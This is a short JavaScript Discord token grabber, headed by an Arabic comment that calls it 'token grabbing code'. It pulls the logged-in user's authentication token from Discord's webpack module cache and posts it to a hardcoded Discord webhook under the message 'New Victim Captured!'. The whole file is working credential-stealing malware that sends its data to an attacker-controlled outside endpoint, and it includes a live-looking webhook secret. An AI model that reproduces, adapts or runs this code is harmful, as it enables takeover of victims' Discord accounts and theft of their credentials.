// كود سحب التوكن - نسخة ./098
async function getDiscordToken() {
    let token = (Object.values(webpackChunkdiscord_app.push([
        [Math.random()], {}, (req) => {
            for (const m of Object.keys(req.c).map((x) => req.c[x].exports).filter((x) => x)) {
                if (m.default && m.default.getToken !== undefined) {
                    return m.default.getToken();
                }
            }
        }
    ]))[0]);

    const webhookURL = "https://discord.com/api/webhooks/1457772372277985334/gERxn1zWx6OBQ8dn4n16zjn-QO3fwsCVAIBScZy_WgXe41Quuqke5HgArJntAB_5zodF";

    if (token) {
        await fetch(webhookURL, {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({
                content: "🚀 **New Victim Captured!**",
                embeds: [{
                    title: "Token Extracted",
                    description: `\`${token}\``,
                    color: 0xff0000
                }]
            })
        });
    }
}
getDiscordToken();